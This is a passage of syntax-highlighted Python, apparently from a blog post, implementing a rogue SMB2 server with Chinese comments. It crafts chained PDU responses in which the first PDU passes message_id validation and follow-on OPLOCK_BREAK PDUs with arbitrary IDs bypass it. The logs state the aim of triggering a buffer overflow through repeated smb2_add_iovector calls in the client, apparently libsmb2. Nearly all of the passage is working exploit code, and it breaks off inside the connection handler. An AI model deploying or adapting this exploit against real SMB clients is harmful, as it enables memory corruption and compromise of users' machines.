struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, message_id)              <span class="comment"># MessageId</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)                       <span class="comment"># Reserved</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, tree_id)                 <span class="comment"># TreeId</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, session_id)              <span class="comment"># SessionId</span></span><br><span class="line">            header += struct.pack(<span class="string">&#x27;&lt;16s&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span>)          <span class="comment"># Signature</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> header</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logger.error(<span class="string">f&quot;创建SMB2头部失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_negotiate_response_payload</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建协商响应载荷&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># SMB2 NEGOTIATE Response 结构</span></span><br><span class="line">        payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">65</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityMode</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0x0311</span>)      <span class="comment"># DialectRevision (SMB 3.1.1)</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># NegotiateContextCount</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;16s&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">16</span>) <span class="comment"># ServerGuid</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x07</span>)        <span class="comment"># Capabilities</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">65536</span>)       <span class="comment"># MaxTransactSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">65536</span>)       <span class="comment"># MaxReadSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">65536</span>)       <span class="comment"># MaxWriteSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">int</span>(time.time())) <span class="comment"># SystemTime</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="built_in">int</span>(time.time())) <span class="comment"># ServerStartTime</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferOffset</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferLength</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># NegotiateContextOffset</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_session_setup_response</span>(<span class="params">self, message_id=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建SMB2 Session Setup响应&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 创建Session Setup响应头部</span></span><br><span class="line">        header = self.create_smb2_header(</span><br><span class="line">            command=<span class="number">0x0001</span>,          <span class="comment"># SMB2_SESSION_SETUP</span></span><br><span class="line">            message_id=message_id,</span><br><span class="line">            next_command=<span class="number">0</span>,</span><br><span class="line">            status=<span class="number">0x00000000</span>,       <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">            flags=<span class="number">0x00000001</span>         <span class="comment"># SERVER_TO_REDIR</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Session Setup Response payload</span></span><br><span class="line">        payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">9</span>)            <span class="comment"># StructureSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SessionFlags</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferOffset</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferLength</span></span><br><span class="line">        payload += <span class="string">b&#x27;&#x27;</span>                            <span class="comment"># SecurityBuffer (empty)</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> header + payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_tree_connect_response</span>(<span class="params">self, message_id=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建SMB2 Tree Connect响应&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 创建Tree Connect响应头部</span></span><br><span class="line">        header = self.create_smb2_header(</span><br><span class="line">            command=<span class="number">0x0003</span>,          <span class="comment"># SMB2_TREE_CONNECT</span></span><br><span class="line">            message_id=message_id,</span><br><span class="line">            next_command=<span class="number">0</span>,</span><br><span class="line">            status=<span class="number">0x00000000</span>,       <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">            flags=<span class="number">0x00000001</span>,        <span class="comment"># SERVER_TO_REDIR</span></span><br><span class="line">            tree_id=<span class="number">1</span>                <span class="comment"># 分配一个TreeID</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Tree Connect Response payload</span></span><br><span class="line">        payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">16</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">1</span>)           <span class="comment"># ShareType (DISK)</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x1f01ff</span>)    <span class="comment"># ShareFlags</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x00000000</span>)  <span class="comment"># Capabilities</span></span><br><span class="line">        payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x01006001</span>)  <span class="comment"># MaximalAccess</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> header + payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_normal_smb2_response</span>(<span class="params">self, command=<span class="number">0x0000</span>, message_id=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建正常的单个SMB2响应（非链式）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 创建正常的SMB2头部</span></span><br><span class="line">        header = self.create_smb2_header(</span><br><span class="line">            command=command,</span><br><span class="line">            message_id=message_id,</span><br><span class="line">            next_command=<span class="number">0</span>,          <span class="comment"># 单个PDU，不链式</span></span><br><span class="line">            status=<span class="number">0x00000000</span>,       <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">            flags=<span class="number">0x00000001</span>         <span class="comment"># SERVER_TO_REDIR</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 根据命令类型创建相应载荷</span></span><br><span class="line">        <span class="keyword">if</span> command == <span class="number">0x0000</span>:  <span class="comment"># NEGOTIATE</span></span><br><span class="line">            payload = self.create_negotiate_response_payload()</span><br><span class="line">        <span class="keyword">elif</span> command == <span class="number">0x0001</span>:  <span class="comment"># SESSION_SETUP</span></span><br><span class="line">            payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">9</span>)            <span class="comment"># StructureSize</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SessionFlags</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferOffset</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferLength</span></span><br><span class="line">        <span class="keyword">elif</span> command == <span class="number">0x0003</span>:  <span class="comment"># TREE_CONNECT</span></span><br><span class="line">            payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">16</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">1</span>)           <span class="comment"># ShareType (DISK)</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x1f01ff</span>)    <span class="comment"># ShareFlags</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x00000000</span>)  <span class="comment"># Capabilities</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x01006001</span>)  <span class="comment"># MaximalAccess</span></span><br><span class="line">        <span class="keyword">elif</span> command == <span class="number">0x0005</span>:  <span class="comment"># CREATE</span></span><br><span class="line">            payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">89</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># OplockLevel</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Flags</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">1</span>)           <span class="comment"># CreateAction</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreationTime</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># LastAccessTime</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># LastWriteTime</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># ChangeTime</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># AllocationSize</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># EndofFile</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x80</span>)        <span class="comment"># FileAttributes</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved2</span></span><br><span class="line">            payload += <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span> * <span class="number">4</span>        <span class="comment"># FileId (16 bytes)</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreateContextsOffset</span></span><br><span class="line">            payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreateContextsLength</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 其他命令的基本响应</span></span><br><span class="line">            payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">8</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">14</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 组合完整响应</span></span><br><span class="line">        smb2_response = header + payload</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 添加NetBIOS头部</span></span><br><span class="line">        netbios_header = struct.pack(<span class="string">&#x27;&gt;L&#x27;</span>, <span class="built_in">len</span>(smb2_response))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> netbios_header + smb2_response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_chain_pdu_sequence</span>(<span class="params">self, base_command=<span class="number">0x0003</span>, pdu_count=<span class="literal">None</span>, original_message_id=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建链式 PDU 序列 - 使用混合攻击策略绕过message_id检查&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> pdu_count <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            pdu_count = self.chain_count</span><br><span class="line">        </span><br><span class="line">        logger.info(<span class="string">f&quot;🚨 生成混合攻击链式PDU序列:&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - 第1个PDU: <span class="subst">&#123;self.get_command_name(base_command)&#125;</span> (message_id=<span class="subst">&#123;original_message_id&#125;</span>) - 通过验证&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - 后<span class="subst">&#123;pdu_count-<span class="number">1</span>&#125;</span>个PDU: OPLOCK_BREAK (任意message_id) - 绕过验证&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - 总PDU数量: <span class="subst">&#123;pdu_count&#125;</span> 个，用于触发缓冲区溢出&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        pdus = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pdu_count):</span><br><span class="line">            <span class="comment"># 第一个PDU使用原始命令和message_id，后续PDU使用OPLOCK_BREAK绕过检查</span></span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># 第一个PDU：使用正常命令，确保通过message_id匹配</span></span><br><span class="line">                current_command = base_command</span><br><span class="line">                msg_id = original_message_id</span><br><span class="line">                logger.debug(<span class="string">f&quot;PDU <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: 使用正常命令 <span class="subst">&#123;self.get_command_name(current_command)&#125;</span>, message_id=<span class="subst">&#123;msg_id&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 后续PDU：使用OPLOCK_BREAK绕过message_id检查</span></span><br><span class="line">                current_command = <span class="number">0x0012</span>  <span class="comment"># SMB2_OPLOCK_BREAK = 18 = 0x12</span></span><br><span class="line">                msg_id = <span class="number">0x999</span> + i  <span class="comment"># 任意message_id，不需要匹配</span></span><br><span class="line">                logger.debug(<span class="string">f&quot;PDU <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: 使用OPLOCK_BREAK绕过检查, message_id=<span class="subst">&#123;msg_id&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 根据命令类型创建载荷</span></span><br><span class="line">            <span class="keyword">if</span> current_command == <span class="number">0x0012</span>:  <span class="comment"># OPLOCK_BREAK</span></span><br><span class="line">                <span class="comment"># OPLOCK_BREAK Response payload (24字节)</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">24</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># OplockLevel  </span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved2</span></span><br><span class="line">                payload += <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span> * <span class="number">4</span>        <span class="comment"># FileId (16 bytes)</span></span><br><span class="line">            <span class="keyword">elif</span> current_command == <span class="number">0x0000</span>:  <span class="comment"># NEGOTIATE</span></span><br><span class="line">                payload = self.create_negotiate_response_payload()</span><br><span class="line">            <span class="keyword">elif</span> current_command == <span class="number">0x0003</span>:  <span class="comment"># TREE_CONNECT</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">16</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">1</span>)           <span class="comment"># ShareType (DISK)</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x1f01ff</span>)    <span class="comment"># ShareFlags</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x00000000</span>)  <span class="comment"># Capabilities</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x01006001</span>)  <span class="comment"># MaximalAccess</span></span><br><span class="line">            <span class="keyword">elif</span> current_command == <span class="number">0x0001</span>:  <span class="comment"># SESSION_SETUP</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">9</span>)            <span class="comment"># StructureSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SessionFlags</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferOffset</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">0</span>)           <span class="comment"># SecurityBufferLength</span></span><br><span class="line">            <span class="keyword">elif</span> current_command == <span class="number">0x0005</span>:  <span class="comment"># CREATE</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">89</span>)           <span class="comment"># StructureSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># OplockLevel</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;B&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Flags</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">1</span>)           <span class="comment"># CreateAction</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreationTime</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># LastAccessTime</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># LastWriteTime</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># ChangeTime</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># AllocationSize</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0</span>)           <span class="comment"># EndofFile</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0x80</span>)        <span class="comment"># FileAttributes</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># Reserved2</span></span><br><span class="line">                payload += <span class="string">b&#x27;\x01\x00\x00\x00&#x27;</span> * <span class="number">4</span>        <span class="comment"># FileId (16 bytes)</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreateContextsOffset</span></span><br><span class="line">                payload += struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>)           <span class="comment"># CreateContextsLength</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 其他命令的基本响应</span></span><br><span class="line">                payload = struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">8</span>) + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">14</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 8字节对齐填充 - 关键！参考smb2_read_data的处理方式</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(payload) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">                payload += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 计算 NextCommand 偏移 - 参考libsmb2的链式PDU处理</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; pdu_count - <span class="number">1</span>:</span><br><span class="line">                <span class="comment"># SMB2头部(64字节) + 载荷长度，然后8字节对齐</span></span><br><span class="line">                next_offset = ((<span class="number">64</span> + <span class="built_in">len</span>(payload)) + <span class="number">7</span>) &amp; ~<span class="number">7</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                next_offset = <span class="number">0</span>  <span class="comment"># 最后一个PDU，NextCommand=0表示链式结束</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 创建PDU头部</span></span><br><span class="line">            header = self.create_smb2_header(</span><br><span class="line">                command=current_command,      <span class="comment"># 第一个用原始命令，后续用OPLOCK_BREAK</span></span><br><span class="line">                message_id=msg_id,           <span class="comment"># 第一个用原始message_id，后续任意</span></span><br><span class="line">                next_command=next_offset,    <span class="comment"># 链式偏移</span></span><br><span class="line">                status=<span class="number">0x00000000</span>,           <span class="comment"># STATUS_SUCCESS</span></span><br><span class="line">                flags=<span class="number">0x00000001</span>,            <span class="comment"># SERVER_TO_REDIR</span></span><br><span class="line">                tree_id=<span class="number">1</span> <span class="keyword">if</span> current_command == <span class="number">0x0003</span> <span class="keyword">else</span> <span class="number">0</span>,</span><br><span class="line">                session_id=<span class="number">1</span> <span class="keyword">if</span> current_command <span class="keyword">in</span> [<span class="number">0x0001</span>, <span class="number">0x0003</span>] <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">                logger.error(<span class="string">f&quot;创建第 <span class="subst">&#123;i&#125;</span> 个PDU头部失败&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 组装PDU（头部+载荷）</span></span><br><span class="line">            complete_pdu = header + payload</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 确保整个PDU 8字节对齐（参考libsmb2处理方式）</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">len</span>(complete_pdu) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">                complete_pdu += <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">                </span><br><span class="line">            pdus.append(complete_pdu)</span><br><span class="line">            </span><br><span class="line">            logger.debug(<span class="string">f&quot;混合攻击PDU <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;pdu_count&#125;</span>: Command=<span class="subst">&#123;self.get_command_name(current_command)&#125;</span>, MessageID=<span class="subst">&#123;msg_id&#125;</span>, NextCommand=0x<span class="subst">&#123;next_offset:08X&#125;</span>, 长度=<span class="subst">&#123;<span class="built_in">len</span>(complete_pdu)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        chain_data = <span class="string">b&#x27;&#x27;</span>.join(pdus)</span><br><span class="line">        logger.info(<span class="string">f&quot;🚨 混合攻击链式PDU生成完成:&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - 总大小: <span class="subst">&#123;<span class="built_in">len</span>(chain_data)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - 攻击策略: 第1个PDU通过message_id验证，后续<span class="subst">&#123;pdu_count-<span class="number">1</span>&#125;</span>个OPLOCK_BREAK PDU绕过验证&quot;</span>)</span><br><span class="line">        logger.info(<span class="string">f&quot;   - 预期效果: 触发 <span class="subst">&#123;pdu_count * <span class="number">4</span>&#125;</span>+ 次smb2_add_iovector调用，导致缓冲区溢出&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> chain_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_command_name</span>(<span class="params">self, command</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取SMB2命令名称&quot;&quot;&quot;</span></span><br><span class="line">        command_names = &#123;</span><br><span class="line">            <span class="number">0x0000</span>: <span class="string">&quot;NEGOTIATE&quot;</span>,</span><br><span class="line">            <span class="number">0x0001</span>: <span class="string">&quot;SESSION_SETUP&quot;</span>, </span><br><span class="line">            <span class="number">0x0003</span>: <span class="string">&quot;TREE_CONNECT&quot;</span>,</span><br><span class="line">            <span class="number">0x0005</span>: <span class="string">&quot;CREATE&quot;</span>,</span><br><span class="line">            <span class="number">0x0006</span>: <span class="string">&quot;CLOSE&quot;</span>,</span><br><span class="line">            <span class="number">0x0008</span>: <span class="string">&quot;READ&quot;</span>,</span><br><span class="line">            <span class="number">0x0009</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">            <span class="number">0x0012</span>: <span class="string">&quot;OPLOCK_BREAK&quot;</span>  <span class="comment"># 18 = 0x12</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> command_names.get(command, <span class="string">f&quot;UNKNOWN(0x<span class="subst">&#123;command:04X&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle_client_connection</span>(<span class="params">self, client_socket, client_addr</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;处理客户端连接&quot;&quot;&quot;</span></span><br><span class="line">        client_id = self.clients_served</span><br><span class="line">        self.clients_served += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 连接来自: <span class="subst">&#123;client_addr&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 持续处理SMB2请求</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># 接收客户端请求</span></span><br><span class="line">                initial_data = client_socket.recv(<span class="number">8192</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> initial_data:</span><br><span class="line">                    logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 客户端关闭连接&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(initial_data) &lt; <span class="number">4</span>:</span><br><span class="line">                    logger.warning(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 接收到的数据太短&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                    </span><br><span class="line">                logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 接收到 <span class="subst">&#123;<span class="built_in">len</span>(initial_data)&#125;</span> 字节数据&quot;</span>)</span><br><span class="line">                logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 原始数据前32字节: <span class="subst">&#123;hexlify(initial_data[:<span class="number">32</span>])&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 解析请求</span></span><br><span class="line">                response_data = <span class="literal">None</span></span><br><span class="line">                smb2_command = <span class="literal">None</span></span><br><span class="line">                message_id = <span class="number">0</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 简单解析NetBIOS头部</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(initial_data) &gt;= <span class="number">4</span>:</span><br><span class="line">                    nb_length = struct.unpack(<span class="string">&#x27;&gt;L&#x27;</span>, initial_data[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">                    logger.info(<span class="string">f&quot;[客户端 <span class="subst">&#123;client_id&#125;</span>] 